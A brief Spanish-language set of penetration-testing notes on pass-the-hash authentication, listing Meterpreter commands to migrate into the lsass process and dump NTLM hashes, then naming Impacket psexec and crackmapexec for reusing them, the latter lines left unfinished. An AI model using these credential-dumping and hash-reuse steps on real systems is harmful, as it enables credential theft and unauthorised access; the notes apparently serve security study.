Técnica para autenticarse usando hashes en lugar de contraseñas.

• No requiere password en texto claro  
• Usa hashes NTLM  
• Muy común en entornos Windows

## Preparación (Meterpreter)

Migrar a proceso con privilegios:

	pgrep lsass
	migrate PID

Dump de hashes:

	hashdump

## Uso del Hash

El hash se puede usar como si fuera la contraseña en diferentes herramientas.

## PsExec (Impacket)

	psexec 
## CrackMapExec

	crackmapexec
